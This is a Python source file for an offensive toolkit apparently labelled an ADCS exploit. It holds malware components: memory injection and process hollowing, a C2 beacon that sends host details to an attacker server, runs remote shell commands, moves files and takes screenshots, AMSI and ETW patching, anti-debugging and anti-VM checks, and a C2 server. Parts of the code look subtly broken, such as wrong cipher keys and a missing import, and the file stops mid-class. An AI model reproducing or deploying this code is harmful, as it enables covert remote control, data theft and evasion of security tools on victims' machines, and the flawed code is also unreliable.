#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import warnings
import argparse
import urllib.parse
import socket
import ipaddress
import subprocess
import threading
import tempfile
import logging
import base64
import struct
import ssl
import hashlib
import zlib
import queue
import select
import re
import string
import ctypes
import platform
import getpass
from datetime import datetime, timedelta
from functools import wraps
from collections import defaultdict

import requests
import cloudscraper
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import undetected_chromedriver as uc
from seleniumwire import webdriver as wire_webdriver
from selenium.webdriver.common.by import By
from stem.control import Controller
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.asn1 import AS_REQ, KRB_ERROR, AS_REP, TGS_REQ, TGS_REP, EncASRepPart, EncTGSRepPart
from impacket.krb5.types import Principal, KerberosTime, Ticket, AuthorizationData
from impacket.examples.ntlmrelayx.utils import Logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, LDAPRelayServer, WinRMRelayServer
from impacket.examples.ntlmrelayx.attacks import NTLMRelayxAttack
from impacket.examples.ntlmrelayx import ntlmrelayx
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetOptions
from impacket import version as impacket_version
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.constants import PreAuthenticationDataTypes, EncryptionTypes, TicketFlags
from impacket.structure import Structure
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.dcomrt import IRemoteShell
from impacket.smbconnection import SMBConnection
from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthAuthenticate
from impacket.crypto import transformKey, encrypt_RC4, decrypt_RC4
import certipy.lib.certipy_logger as certipy_logger
import certipy.lib.certipy_client as certipy_client
import certipy.lib.certipy_utils as certipy_utils
import ntlmrelayx.attacks
from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
init(autoreset=True)

# PyQt5 imports
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, 
                            QPushButton, QGroupBox, QTextEdit, QLabel, QSplitter, 
                            QFileDialog, QMessageBox, QAction, QMenu, QMenuBar, 
                            QDialog, QLineEdit, QFormLayout, QDialogButtonBox, QCompleter,
                            QScrollArea, QFrame, QStatusBar, QSystemTrayIcon, QStyle,
                            QToolBar, QComboBox, QSpinBox, QCheckBox, QRadioButton,
                            QButtonGroup, QListWidget, QListWidgetItem, QProgressBar,
                            QInputDialog, QAbstractItemView)
from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, QSize, QUrl, QMimeData, QBuffer, QIODevice
from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, QClipboard, QDrag, QDesktopServices
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtWebChannel import QWebChannel
from PyQt5.QtWebSockets import QWebSocketServer

# Global constants
LOG_JSON_PATH = "elaina_ultimate_log.json"
COOKIE_PATH = "elaina_ultimate_cookies.txt"
LOG_JSON_FILE = "adcs_exploit_log.json"
CCACHE_PATH = "golden_ticket.ccache"
C2_CONFIG_PATH = "c2_config.json"
BEACON_CONFIG_PATH = "beacon_config.bin"

# Logging setup
logger = logging.getLogger("ADCSExploit")
logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
console_format = logging.Formatter("\033[1;32m%(asctime)s\033[0m [\033[1;34m%(levelname)s\033[0m] \033[1;33m%(module)s\033[0m: %(message)s", datefmt="%H:%M:%S")
console_handler.setFormatter(console_format)
logger.addHandler(console_handler)

log_entries = []

def log(action, target, status, detail=None):
    entry = {
        "action": action,
        "target": target,
        "status": status,
        "detail": detail or "",
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    log_entries.append(entry)
    with open(LOG_JSON_PATH, "w") as f:
        json.dump(log_entries, f, indent=2)
    logger.info(f"{action} {target} {status} {detail or ''}")

def retry(ExceptionToCheck, tries=3, delay=2, backoff=2):
    def deco_retry(f):
        @wraps(f)
        def f_retry(*args, **kwargs):
            mtries, mdelay = tries, delay
            while mtries > 1:
                try:
                    return f(*args, **kwargs)
                except ExceptionToCheck as e:
                    logger.warning(f"Retry {f.__name__} due to: {str(e)}. Waiting {mdelay}s")
                    time.sleep(mdelay)
                    mtries -= 1
                    mdelay *= backoff
            return f(*args, **kwargs)
        return f_retry
    return deco_retry

def random_sleep(min_s=0.5, max_s=2):
    time.sleep(random.uniform(min_s, max_s))

def colorize(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

def random_string(length=8):
    """Generate a random string"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

class AdvancedEncryption:
    def __init__(self):
        self.algorithm = algorithms.AES(256)
        self.mode = modes.GCM(96)
        self.key_size = 32
        
    def generate_key(self, password, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.key_size,
            salt=salt,
            iterations=100000,
        )
        return kdf.derive(password.encode())
    
    def encrypt(self, data, key):
        iv = os.urandom(12)
        cipher = Cipher(self.algorithm, self.mode, backend=default_backend())
        encryptor = cipher.encryptor(key)
        
        encryptor.authenticate_additional_data(b"additional_data")
        ciphertext = encryptor.update(data) + encryptor.finalize()
        
        return iv + ciphertext + encryptor.tag
    
    def decrypt(self, encrypted_data, key):
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        
        cipher = Cipher(self.algorithm, self.mode, backend=default_backend())
        decryptor = cipher.decryptor(key, iv)
        
        decryptor.authenticate_additional_data(b"additional_data")
        return decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)

class AdvancedDomainGenerator:
    def __init__(self):
        self.legitimate_domains = [
            "google.com", "microsoft.com", "amazon.com", "cloudflare.com",
            "github.com", "stackoverflow.com", "wikipedia.org", "youtube.com"
        ]
        
    def generate_domain(self):
        base_domain = random.choice(self.legitimate_domains)
        subdomain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        tld = random.choice(['com', 'org', 'net', 'io', 'co', 'ai'])
        return f"{subdomain}.{base_domain}.{tld}"
    
    def generate_url_list(self, count=10):
        urls = []
        for _ in range(count):
            domain = self.generate_domain()
            path = '/'.join(random.choices(['api', 'v1', 'v2', 'cdn', 'static', 'assets'], k=random.randint(1, 3)))
            urls.append(f"https://{domain}/{path}")
        return urls

class TrafficShaper:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        
    def shape_request(self, data):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        
        time.sleep(random.uniform(0.1, 0.5))
        return headers, data
    
    def jitter_sleep(self, base_sleep, jitter_percent=0.3):
        jitter = random.uniform(0, jitter_percent)
        sleep_time = base_sleep * (1 + jitter)
        time.sleep(sleep_time)

class AdvancedMemoryOperations:
    def __init__(self):
        if platform.system() == "Windows":
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.virtual_alloc = self.kernel32.VirtualAlloc
            self.virtual_protect = self.kernel32.VirtualProtect
            self.create_thread = self.kernel32.CreateThread
            self.wait_for_single_object = self.kernel32.WaitForSingleObject
        
    def reflective_inject(self, payload, target_process):
        if platform.system() != "Windows":
            return None
            
        memory_size = len(payload)
        base_address = self.virtual_alloc(
            target_process,
            0,
            memory_size,
            0x3000,
            0x40,
            0
        )
        
        if not base_address:
            raise ctypes.WinError(ctypes.get_last_error())
        
        ctypes.memmove(base_address, payload, memory_size)
        
        old_protect = ctypes.wintypes.DWORD(0)
        if not self.virtual_protect(
            target_process,
            base_address,
            memory_size,
            0x20,
            ctypes.byref(old_protect)
        ):
            raise ctypes.WinError(ctypes.get_last_error())
        
        thread_id = ctypes.wintypes.DWORD(0)
        thread_handle = self.create_thread(
            target_process,
            None,
            0,
            base_address,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            raise ctypes.WinError(ctypes.get_last_error())
        
        return thread_handle

class ProcessHollowing:
    def __init__(self):
        if platform.system() == "Windows":
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.create_process = self.kernel32.CreateProcessW
            self.virtual_alloc_ex = self.kernel32.VirtualAllocEx
            self.write_process_memory = self.kernel32.WriteProcessMemory
            self.get_thread_context = self.kernel32.GetThreadContext
            self.set_thread_context = self.kernel32.SetThreadContext
            self.resume_thread = self.kernel32.ResumeThread
        
    def hollow_process(self, target_exe, payload):
        if platform.system() != "Windows":
            return None
            
        startup_info = ctypes.wintypes.STARTUPINFOW()
        process_info = ctypes.wintypes.PROCESS_INFORMATION()
        
        if not self.create_process(
            None,
            target_exe,
            None,
            None,
            0x00000004,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        ):
            raise ctypes.WinError(ctypes.get_last_error())
        
        payload_size = len(payload)
        base_address = self.virtual_alloc_ex(
            process_info.hProcess,
            None,
            payload_size,
            0x3000,
            0x40,
            None
        )
        
        if not base_address:
            raise ctypes.WinError(ctypes.get_last_error())
        
        if not self.write_process_memory(
            process_info.hProcess,
            base_address,
            payload,
            payload_size
        ):
            raise ctypes.WinError(ctypes.get_last_error())
        
        context = ctypes.wintypes.CONTEXT()
        self.get_thread_context(process_info.hThread, ctypes.byref(context))
        
        context.Rcx = base_address
        
        if not self.set_thread_context(process_info.hThread, ctypes.byref(context)):
            raise ctypes.WinError(ctypes.get_last_error())
        
        if not self.resume_thread(process_info.hThread):
            raise ctypes.WinError(ctypes.get_last_error())
        
        return process_info.hProcess

class OptimizedBeacon:
    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.c2_type = c2_type
        self.ssl_enabled = ssl_enabled
        self.beacon_id = self.generate_beacon_id()
        self.sleep_time = random.randint(60, 300)
        self.jitter = random.uniform(0.2, 0.4)
        self.max_retries = 3
        self.user_agent = self.get_legitimate_user_agent()
        self.encryption = AdvancedEncryption()
        self.traffic_shaper = TrafficShaper()
        self.domain_generator = AdvancedDomainGenerator()
        self.running = False
        
    def generate_beacon_id(self):
        return f"{random_string(8)}-{random_string(4)}-{random_string(4)}-{random_string(4)}-{random_string(12)}"
    
    def get_legitimate_user_agent(self):
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ])
    
    def encrypt_data(self, data):
        key = os.urandom(32)
        iv = os.urandom(12)
        
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        encryptor.authenticate_additional_data(b"beacon_data")
        ciphertext = encryptor.update(data.encode()) + encryptor.finalize()
        
        return base64.b64encode(iv + ciphertext + encryptor.tag).decode()
    
    def decrypt_data(self, data):
        try:
            decoded_data = base64.b64decode(data)
            iv = decoded_data[:12]
            tag = decoded_data[-16:]
            ciphertext = decoded_data[12:-16]
            
            cipher = Cipher(algorithms.AES(iv), modes.GCM(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            
            decryptor.authenticate_additional_data(b"beacon_data")
            return decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)
        except Exception:
            return None
    
    def get_system_info(self):
        try:
            info = {
                "os": platform.system(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "architecture": platform.machine(),
                "version": platform.version(),
                "beacon_id": self.beacon_id
            }
            
            if info["os"] == "Windows":
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                    info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
                    info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
                    winreg.CloseKey(key)
                except:
                    pass
            
            return info
        except Exception:
            return {
                "os": "Unknown",
                "hostname": "Unknown",
                "user": "Unknown",
                "beacon_id": self.beacon_id
            }
    
    def register_beacon(self):
        try:
            sys_info = self.get_system_info()
            data = json.dumps(sys_info)
            encrypted_data = self.encrypt_data(data)
            
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            }
            
            url = f"https://{self.c2_host}:{self.c2_port}/{random_string(8)}/{random_string(8)}.php"
            
            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200
        except Exception:
            return False
    
    def get_tasks(self):
        try:
            url = f"https://{self.c2_host}:{self.c2_port}/{random_string(8)}/{random_string(8)}.css"
            
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "text/css,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0"
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                encrypted_data = response.text
                data = self.decrypt_data(encrypted_data)
                
                if data:
                    tasks = json.loads(data.decode()).get("tasks", [])
                    return tasks
            
            return []
        except Exception:
            return []
    
    def send_result(self, task_id, result):
        try:
            data = json.dumps({
                "task_id": task_id,
                "result": result
            })
            encrypted_data = self.encrypt_data(data)
            
            url = f"https://{self.c2_host}:{self.c2_port}/{random_string(8)}/{random_string(8)}.js"
            
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/javascript,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200
        except Exception:
            return False
    
    def execute_task(self, task):
        try:
            task_type = task.get("type")
            task_data = task.get("data")
            task_id = task.get("task_id")
            
            result = {"status": "error", "message": "Unknown task type"}
            
            if task_type == "shell":
                try:
                    process = subprocess.Popen(
                        task_data, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate()
                    
                    result = {
                        "status": "success",
                        "exit_code": process.returncode,
                        "stdout": stdout,
                        "stderr": stderr
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "upload":
                try:
                    file_path = task_data.get("file_path")
                    content = task_data.get("content")
                    
                    with open(file_path, "w") as f:
                        f.write(content)
                    
                    result = {
                        "status": "success",
                        "message": f"File uploaded to {file_path}"
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "download":
                try:
                    file_path = task_data.get("file_path")
                    
                    with open(file_path, "rb") as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                    
                    result = {
                        "status": "success",
                        "content": content
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "screenshot":
                try:
                    import pyautogui
                    screenshot = pyautogui.screenshot()
                    screenshot_path = f"/tmp/screenshot_{int(time.time())}.png"
                    screenshot.save(screenshot_path)
                    
                    with open(screenshot_path, "rb") as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                    
                    result = {
                        "status": "success",
                        "content": content,
                        "path": screenshot_path
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "kill":
                self.running = False
                result = {
                    "status": "success",
                    "message": "Beacon shutting down"
                }
            
            self.send_result(task_id, result)
            return result
        except Exception as e:
            result = {
                "status": "error",
                "message": str(e)
            }
            self.send_result(task_id, result)
            return result
    
    def start(self):
        try:
            if not self.register_beacon():
                return False
            
            self.running = True
            
            while self.running:
                try:
                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
                    time.sleep(actual_sleep)
                    
                    tasks = self.get_tasks()
                    
                    for task in tasks:
                        self.execute_task(task)
                
                except KeyboardInterrupt:
                    self.running = False
                except Exception:
                    time.sleep(30)
            
            return True
        except Exception:
            return False

class StealthBeacon(OptimizedBeacon):
    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False):
        super().__init__(c2_host, c2_port, c2_type, ssl_enabled)
        
        self.anti_debug = True
        self.anti_vm = True
        self.sandbox_detection = True
        self.amsi_bypass = True
        self.etw_bypass = True
        
    def check_debugger(self):
        try:
            if platform.system() != "Windows":
                return False
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            is_debugger_present = kernel32.IsDebuggerPresent
            
            if is_debugger_present():
                return True
            
            check_remote_debugger_present = kernel32.CheckRemoteDebuggerPresent
            if check_remote_debugger_present():
                return True
            
            return False
        except:
            return False
    
    def check_vm(self):
        try:
            if platform.system() != "Windows":
                return False
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            hkey = ctypes.wintypes.HKEY()
            try:
                if ctypes.windll.advapi32.RegOpenKeyExW(
                    0x80000002,
                    r"HARDWARE\DESCRIPTION\System",
                    0,
                    0x20019,
                    ctypes.byref(hkey)
                ) == 0:
                    value = ctypes.create_string_buffer(256)
                    size = ctypes.wintypes.DWORD(256)
                    if ctypes.windll.advapi32.RegQueryValueExW(
                        hkey,
                        "SystemBiosVersion",
                        0,
                        None,
                        value,
                        ctypes.byref(size)
                    ) == 0:
                        bios_info = value.value.decode('utf-8', errors='ignore')
                        if "vbox" in bios_info.lower() or "vmware" in bios_info.lower():
                            ctypes.windll.advapi32.RegCloseKey(hkey)
                            return True
                    
                    ctypes.windll.advapi32.RegCloseKey(hkey)
            except:
                pass
            
            processes = [
                "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
                "vboxservice.exe", "vboxtray.exe",
                "prl_cc.exe", "prl_tools.exe",
                "xenservice.exe", "qemu-ga.exe"
            ]
            
            for process in processes:
                try:
                    h_process = kernel32.OpenProcess(0x0400, False, self.get_process_id(process))
                    if h_process:
                        kernel32.CloseHandle(h_process)
                        return True
                except:
                    pass
            
            return False
        except:
            return False
    
    def get_process_id(self, process_name):
        try:
            if platform.system() != "Windows":
                return None
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            psapi = ctypes.WinDLL('psapi', use_last_error=True)
            
            process_ids = (ctypes.wintypes.DWORD * 1024)()
            cb_needed = ctypes.wintypes.DWORD()
            
            if psapi.EnumProcesses(process_ids, ctypes.sizeof(process_ids), ctypes.byref(cb_needed)):
                for process_id in process_ids:
                    if process_id:
                        h_process = kernel32.OpenProcess(0x0400, False, process_id)
                        if h_process:
                            try:
                                process_name_buffer = ctypes.create_string_buffer(260)
                                cb_returned = ctypes.wintypes.DWORD()
                                
                                if kernel32.QueryFullProcessImageNameA(
                                    h_process,
                                    process_name_buffer,
                                    ctypes.byref(cb_returned)
                                ):
                                    if process_name.lower() in process_name_buffer.value.lower():
                                        kernel32.CloseHandle(h_process)
                                        return process_id
                            finally:
                                kernel32.CloseHandle(h_process)
            
            return None
        except:
            return None
    
    def bypass_amsi(self):
        try:
            if platform.system() != "Windows":
                return False
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            amsi_dll = kernel32.LoadLibraryA("amsi.dll")
            if not amsi_dll:
                return False
            
            amsi_scan_buffer = kernel32.GetProcAddress(amsi_dll, "AmsiScanBuffer")
            if not amsi_scan_buffer:
                return False
            
            old_protect = ctypes.wintypes.DWORD(0)
            if not kernel32.VirtualProtect(
                amsi_scan_buffer,
                1,
                0x40,
                ctypes.byref(old_protect)
            ):
                return False
            
            patch = b"\xC3"
            ctypes.memmove(amsi_scan_buffer, patch, len(patch))
            
            kernel32.VirtualProtect(
                amsi_scan_buffer,
                1,
                old_protect,
                ctypes.byref(old_protect)
            )
            
            return True
        except:
            return False
    
    def bypass_etw(self):
        try:
            if platform.system() != "Windows":
                return False
                
            ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
            
            etw_event_write = ntdll.EtwEventWrite
            if not etw_event_write:
                return False
            
            old_protect = ctypes.wintypes.DWORD(0)
            if not ntdll.VirtualProtect(
                etw_event_write,
                1,
                0x40,
                ctypes.byref(old_protect)
            ):
                return False
            
            patch = b"\xC3"
            ctypes.memmove(etw_event_write, patch, len(patch))
            
            ntdll.VirtualProtect(
                etw_event_write,
                1,
                old_protect,
                ctypes.byref(old_protect)
            )
            
            return True
        except:
            return False
    
    def start(self):
        try:
            if self.anti_debug and self.check_debugger():
                return False
            
            if self.anti_vm and self.check_vm():
                return False
            
            if self.amsi_bypass and self.bypass_amsi():
                pass
            
            if self.etw_bypass and self.bypass_etw():
                pass
            
            if not self.register_beacon():
                return False
            
            self.running = True
            
            while self.running:
                try:
                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
                    time.sleep(actual_sleep)
                    
                    tasks = self.get_tasks()
                    
                    for task in tasks:
                        self.execute_task(task)
                
                except KeyboardInterrupt:
                    self.running = False
                except Exception:
                    time.sleep(30)
            
            return True
        except Exception:
            return False

class C2Server:
    def __init__(self, host="0.0.0.0", port=8080, ssl_enabled=False, cert_file=None, key_file=None):
        self.host = host
        self.port = port
        self.ssl_enabled = ssl_enabled
        self.cert_file = cert_file
        self.key_file = key_file
        self.server_socket = None
        self.clients = {}
        self.tasks = {}
        self.results = {}
        self.beacon_config = self._generate_beacon_config()
        self._save_beacon_config()
        self.encryption = AdvancedEncryption()
        self.domain_generator = AdvancedDomainGenerator()
        
    def _generate_beacon_config(self):
        config = {
            "beacon_type": "http",
            "sleep_time": random.randint(30, 120),
            "jitter": random.uniform(0.1, 0.3),
            "max_retries": 3,
            "user_agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
            ]),
            "urls": [
                f"/wp-content/plugins/{random_string(8)}/",
                f"/wp-includes/css/{random_string(8)}.css",
                f"/wp-admin/admin-ajax.php?action={random_string(8)}"
            ],
            "dns_domain": f"c2.{random_string(8)}.com",
            "dns_sleep": random.randint(60, 180),
            "smb_pipe": f"\\{random_string(4)}\\pipe\\{random_string(8)}",
            "tcp_port": random.randint(40000, 50000),
            "public_key": self._generate_rsa_keys()[0],
            "encryption_key": os.urandom(32).hex(),
            "kill_date": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d"),
            "watermark": random.randint(10000, 99999)
        }
        return config
    
    def _generate_rsa_keys(self):
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        private_pem = private_key.private_bytes(
            encoding=Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        return public_pem.decode('utf-8'), private_pem.decode('utf-8')
    
    def _save_beacon_config(self):
        with open(BEACON_CONFIG_PATH, 'wb') as f:
            f.write(json.dumps(self.beacon_config).encode('utf-8'))
        logger.info(f"Beacon configuration saved to {BEACON_CONFIG_PATH}")
    
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            if self.ssl_enabled and self.cert_file and self.key_file:
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                self.server_socket = context.wrap_socket(self.server_socket, server_side=True)
                logger.info(f"SSL enabled C2 server started on {self.host}:{self.port}")
            else:
                logger.info(f"C2 server started on {self.host}:{self.port}")
            
            listener_thread = threading.Thread(target=self._listen_for_clients)
            listener_thread.daemon = True
            listener_thread.start()
            
            processor_thread = threading.Thread(target=self._process_commands)
            processor_thread.daemon = True
            processor_thread.start()
            
            return True
        except Exception as e:
            logger.error(f"Failed to start C2 server: {str(e)}")
            return False
    
    def _listen_for_clients(self):
        while True:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_id = f"{client_address[0]}:{client_address[1]}:{int(time.time())}"
                
                logger.info(f"New connection from {client_address} assigned ID {client_id}")
                
                self.clients[client_id] = {
                    "socket": client_socket,
                    "address": client_address,
                    "last_checkin": time.time(),
                    "os": "Unknown",
                    "user": "Unknown",
                    "hostname": "Unknown",
                    "privileges": "User"
                }
                
                client_thread = threading.Thread(target=self._handle_client, args=(client_id,))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                logger.error(f"Error accepting client connection: {str(e)}")
    
    def _handle_client(self, client_id):
        client = self.clients.get(client_id)
        if not client:
            return
        
        socket = client["socket"]
        socket.settimeout(60)
        
        try:
            initial_data = socket.recv(4096)
            if not initial_data:
                raise Exception("No initial data received")
            
            beacon_info = self._parse_beacon_info(initial_data)
            if beacon_info:
                client.update(beacon_info)
                logger.info(f"Beacon {client_id} - {beacon_info.get('hostname', 'Unknown')}\\{beacon_info.get('user', 'Unknown')} ({beacon_info.get('os', 'Unknown')})")
            
            if client_id in self.tasks:
                self._send_tasks(client_id)
            
            while True:
                try:
                    ready = select.select([socket], [], [], 1)
                    if ready[0]:
                        data = socket.recv(4096)
                        if not data:
                            break
                        
                        result = self._process_client_data(client_id, data)
                        if result:
                            logger.debug(f"Received result from {client_id}: {result[:100]}...")
                    
                    if client_id in self.tasks and self.tasks[client_id]:
                        self._send_tasks(client_id)
                    
                    client["last_checkin"] = time.time()
                    
                except socket.timeout:
                    if time.time() - client["last_checkin"] > 300:
                        logger.warning(f"Beacon {client_id} timed out")
                        break
                except Exception as e:
                    logger.error(f"Error handling client {client_id}: {str(e)}")
                    break
        except Exception as e:
            logger.error(f"Error in client handler for {client_id}: {str(e)}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            try:
                socket.close()
            except:
                pass
            logger.info(f"Client {client_id} disconnected")
    
    def _parse_beacon_info(self, data):
        try:
            beacon_info = json.loads(data.decode('utf-8'))
            return beacon_info
        except Exception as e:
            logger.error(f"Error parsing beacon info: {str(e)}")
            return None
    
    def _process_client_data(self, client_id, data):
        try:
            result = json.loads(data.decode('utf-8'))
            
            if client_id not in self.results:
                self.results[client_id] = []
            self.results[client_id].append({
                "timestamp": time.time(),
                "result": result
            })
            
            if "task_id" in result and client_id in self.tasks:
                self.tasks[client_id] = [t for t in self.tasks[client_id] if t.get("task_id") != result.get("task_id")]
            
            return result
        except Exception as e:
            logger.error(f"Error processing client data: {str(e)}")
            return None
    
    def _send_tasks(self, client_id):
        client = self.clients.get(client_id)
        if not client:
            return
        
        try:
            tasks = self.tasks.get(client_id, [])
            if not tasks:
                return
            
            data = json.dumps({"tasks": tasks}).encode('utf-8')
            client["socket"].send(data)
            
            logger.debug(f"Sent {len(tasks)} tasks to {client_id}")
        except Exception as e:
            logger.error(f"Error sending tasks to {client_id}: {str(e)}")
    
    def _process_commands(self):
        while True:
            time.sleep(1)
    
    def add_task(self, client_id, task_type, task_data, task_id=None):
        if not task_id:
            task_id = f"{client_id}-{int(time.time())}"
        
        if client_id not in self.tasks:
            self.tasks[client_id] = []
        
        self.tasks[client_id].append({
            "task_id": task_id,
            "type": task_type,
            "data": task_data,
            "created": time.time()
        })
        
        logger.info(f"Added task {task_id} ({task_type}) for {client_id}")
        return task_id
    
    def list_clients(self):
        return self.clients
    
    def get_client_info(self, client_id):
        return self.clients.get(client_id)
    
    def get_results(self, client_id, limit=10):
        if client_id not in self.results:
            return []
        
        return self.results[client_id][-limit:]
    
    def stop(self):
        if self.server_socket:
            self.server_socket.close()
        logger.info("C2 server stopped")

class OutputDisplayWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout(self)
        
        self.output_tabs = QTabWidget()
        layout.addWidget(self.output_tabs)
        
        self.console_tab = QWidget()
        console_layout = QVBoxLayout(self.console_tab)
        
